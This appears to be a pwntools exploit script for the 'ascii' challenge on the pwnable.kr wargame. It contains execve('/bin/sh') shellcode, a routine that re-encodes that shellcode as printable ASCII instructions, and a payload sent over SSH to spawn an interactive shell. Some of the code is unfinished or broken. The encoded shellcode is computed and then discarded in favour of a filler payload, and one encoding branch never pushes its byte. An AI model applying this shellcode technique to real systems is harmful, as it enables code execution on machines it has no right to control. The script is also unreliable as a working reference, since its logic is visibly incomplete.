#!/usr/bin/env python3

from pwn import *
from ctypes import c_uint8
exe = ELF("./ascii")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='b *0x08048F0C\n c')
    else:
        s = ssh('ascii', 'pwnable.kr', 2222, 'guest')
        r = s.process('/home/ascii/ascii')

    return r

def is_num_ascii(num, bytes_):
    for _ in range(bytes_):
        current_byte = num & 0xff
        if  current_byte < 0x20 or current_byte >= 0x80:
            return False
        num >>= 8
    return True
    
def find_xor_pair(byte):
    """
    find a pair of printable nums that result in byte when xored
    """
    for a in range(0x20, 0x80):
        if is_num_ascii(a ^ byte, 1):
            return a, a^byte
    return None

def find_sub_pair(byte):
    """
    find a pair of printable nums that result in byte when added
    """
    for part1 in range(0x20, 0x80):
        part2 = c_uint8(byte+part1).value
        if is_num_ascii(part2, 1):
            return part2, part1
    return None

def printable_push(dword):
    """
    generates code to push a number to stack using
    """
    result = b''
    
    if is_num_ascii(dword, 4):
        return asm(f'push {dword}')
    
    for i in range(4):
        current_byte = dword & 0xff
        
        if is_num_ascii(current_byte, 1):
            result += asm(f'push BYTE PTR {current_byte}')
            
        elif pair := find_xor_pair(current_byte):
            a = f"""
            push BYTE PTR {pair[0]}
            push esp
            pop eax
            push {(pair[1]<<8)|0x41410041}
            pop ebx
            xor BYTE PTR [eax], bh
            """
            result += asm(a)
        elif pair := find_sub_pair(current_byte):
            a = f"""
            push BYTE PTR {pair[0]}
            push esp
            pop eax
            push {(pair[1]<<8)|0x41410041}
            pop ebx
            sub BYTE PTR [eax], bh           
            """
            result += asm(a)
        elif current_byte >= 0x80:
            a = """
            push DWORD PTR 0x4141417f
            pop eax
            
            """ + ('inc al\n' *( current_byte - 0x7f))
            result += asm(a)
            
        else:
            print(f"dont know how to do this byte: {hex(current_byte)}")
            
        
        dword >>= 8 
    return result
        

def set_reg(regname, num):
    if is_num_ascii(num, 4):
        return asm(f'push {num}\n pop {regname}') # push pop are mostly printable...


def main():
    r = conn()

    # https://shell-storm.org/shellcode/files/shellcode-827.html
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    chunks =[ shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
    result = b''
    for i in chunks:
        c = u32(i.rjust(4))
        result += printable_push(c)
    print(len(result))
    result = b"A"*167
    r.send(result.rjust(167, b' ') + b'\x00')
    r.interactive()


if __name__ == "__main__":
    main()
